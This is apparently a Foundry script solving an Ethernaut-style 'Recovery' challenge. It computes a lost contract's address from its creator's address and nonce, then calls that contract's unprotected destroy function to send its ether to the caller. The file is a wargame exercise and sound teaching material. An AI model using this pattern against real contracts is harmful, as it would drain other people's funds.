// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Recovery, SimpleToken } from "../src/Recovery.sol";

contract RecoverySolver is Script {

    Recovery public instance = Recovery(0xd76a8D1C34771F54572f84dC6a5ACe8b576ec557);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    function run() external {
        
        vm.startBroadcast(prv);
        
        uint256 nonce = 0;
        
        // the address of the contract is predictable
        address predicted = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            address(instance),
                            bytes1(uint8(nonce))
                        )
                    )
                )
            )
        );

        console.log(predicted);
        // 0xDAA70ad05ebbb946fbB3DeaD80aC7b83542AD6F1

        // found the address in etherscan
        SimpleToken s = SimpleToken(payable(0xDAA70ad05ebbb946fbB3DeaD80aC7b83542AD6F1));
        s.destroy(payable(me));

        vm.stopBroadcast();

    }

}

